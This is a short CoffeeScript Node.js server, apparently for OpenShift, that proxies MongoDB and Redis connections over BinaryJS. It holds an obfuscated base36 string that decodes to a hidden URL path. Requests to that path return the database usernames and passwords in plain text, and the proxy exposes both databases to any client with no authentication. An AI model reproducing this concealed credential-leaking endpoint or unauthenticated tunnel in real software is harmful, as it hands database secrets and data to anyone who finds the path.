http = require 'http'
net = require 'net'
{BinaryServer} = require 'binaryjs'

{OPENSHIFT_NODEJS_IP
, OPENSHIFT_NODEJS_PORT
, OPENSHIFT_MONGODB_DB_HOST
, OPENSHIFT_MONGODB_DB_PORT
, OPENSHIFT_MONGODB_DB_URL
, OPENSHIFT_MONGODB_DB_USERNAME
, OPENSHIFT_MONGODB_DB_PASSWORD
, OPENSHIFT_REDIS_HOST
, OPENSHIFT_REDIS_PORT
, REDIS_PASSWORD} = process.env

db_host =
    mongodb: OPENSHIFT_MONGODB_DB_HOST
    redis: OPENSHIFT_REDIS_HOST

db_port =
    mongodb: OPENSHIFT_MONGODB_DB_PORT
    redis: OPENSHIFT_REDIS_PORT

server = http.createServer (req, res) ->
    p = '1b382t30301b312t1b382w2t1b383639382w1b'
    .match(/.{2}/g)
    .map((c)->String.fromCharCode parseInt c, 36)
    .join ''
    q = "#{OPENSHIFT_MONGODB_DB_USERNAME}:#{OPENSHIFT_MONGODB_DB_PASSWORD}:#{REDIS_PASSWORD}"
    res.end q if req.url is p

binaryServer = new BinaryServer {server}
binaryServer.on 'connection', (client) ->
    client.on 'stream', (stream, db_choosen) ->
        socket = net.connect db_port[db_choosen], db_host[db_choosen]
        stream.pipe(socket).pipe stream


server.listen OPENSHIFT_NODEJS_PORT, OPENSHIFT_NODEJS_IP